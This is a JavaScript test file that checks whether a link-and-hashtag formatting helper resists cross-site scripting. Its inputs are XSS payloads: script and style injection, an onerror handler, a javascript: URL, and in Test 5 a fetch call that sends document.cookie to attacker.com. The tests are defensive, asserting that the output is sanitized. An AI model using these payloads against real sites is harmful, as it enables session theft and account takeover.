// Security Tests for XSS Vulnerability Fix
// Run with: npm test

import { formatTextWithLinks } from './helpers.js';

console.log('🧪 Running XSS Security Tests...\n');

// Test Helper
function test(name, input, shouldNotContain) {
  const result = formatTextWithLinks(input);
  const isVulnerable = shouldNotContain.some(pattern => result.includes(pattern));
  
  if (isVulnerable) {
    console.log(`❌ FAILED: ${name}`);
    console.log(`   Input: ${input}`);
    console.log(`   Output: ${result}`);
    return false;
  } else {
    console.log(`✅ PASSED: ${name}`);
    return true;
  }
}

let passCount = 0;
let failCount = 0;

// ========== SECURITY TESTS ==========

// Test 1: Script Injection
if (test(
  'Script Injection Prevention',
  '"><script>alert("XSS")</script><"',
  ['<script>', 'alert(']
)) passCount++; else failCount++;

// Test 2: Event Handler Injection
if (test(
  'Event Handler Injection Prevention',
  '"><img src=x onerror=alert("XSS")>"',
  ['onerror=', 'alert(']
)) passCount++; else failCount++;

// Test 3: JavaScript URL
if (test(
  'JavaScript URL Prevention',
  '"><a href="javascript:alert(\'XSS\')">Click</a><"',
  ['javascript:', 'alert(']
)) passCount++; else failCount++;

// Test 4: Style Injection
if (test(
  'Style Injection Prevention',
  '"><style>body { display: none; }</style><"',
  ['<style>', 'display: none']
)) passCount++; else failCount++;

// Test 5: Data Exfiltration via Cookie
if (test(
  'Cookie Exfiltration Prevention',
  '"><img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
  ['fetch(', 'document.cookie', 'onerror=']
)) passCount++; else failCount++;

// ========== REGRESSION TESTS ==========

// Test 6: Normal URLs Still Work
console.log('\n🔄 Regression Tests:\n');
let result = formatTextWithLinks('Check https://example.com for info');
if (result.includes('<a href="https://example.com"') && result.includes('target="_blank"')) {
  console.log('✅ PASSED: Normal URL Linkification');
  passCount++;
} else {
  console.log('❌ FAILED: Normal URL Linkification');
  console.log(`   Output: ${result}`);
  failCount++;
}

// Test 7: Hashtags Still Work
result = formatTextWithLinks('#security #xss prevention');
if (result.includes('#security') && result.includes('#xss')) {
  console.log('✅ PASSED: Hashtag Formatting');
  passCount++;
} else {
  console.log('❌ FAILED: Hashtag Formatting');
  console.log(`   Output: ${result}`);
  failCount++;
}

// Test 8: Mixed Content
result = formatTextWithLinks('Read about #security at https://example.com');
if (result.includes('<a href="https://example.com"') && result.includes('#security')) {
  console.log('✅ PASSED: Mixed Content (URLs + Hashtags)');
  passCount++;
} else {
  console.log('❌ FAILED: Mixed Content');
  console.log(`   Output: ${result}`);
  failCount++;
}

// Test 9: Empty/Null Input
result = formatTextWithLinks(null);
if (result === null) {
  console.log('✅ PASSED: Null Input Handling');
  passCount++;
} else {
  console.log('❌ FAILED: Null Input Handling');
  failCount++;
}

// Test 10: HTML Special Characters Are Escaped
result = formatTextWithLinks('Hello & goodbye < > " \'');
if (!result.includes('<') && !result.includes('>') && result.includes('&amp;') && result.includes('&lt;') && result.includes('&gt;')) {
  console.log('✅ PASSED: HTML Character Escaping');
  passCount++;
} else {
  console.log('❌ FAILED: HTML Character Escaping');
  console.log(`   Output: ${result}`);
  failCount++;
}

// ========== SUMMARY ==========
console.log(`\n${'='.repeat(50)}`);
console.log(`Test Results: ${passCount} passed, ${failCount} failed`);
console.log(`${'='.repeat(50)}\n`);

if (failCount === 0) {
  console.log('🎉 All tests passed! XSS vulnerability is fixed.\n');
  process.exit(0);
} else {
  console.log('⚠️ Some tests failed. Security issues may persist.\n');
  process.exit(1);
}
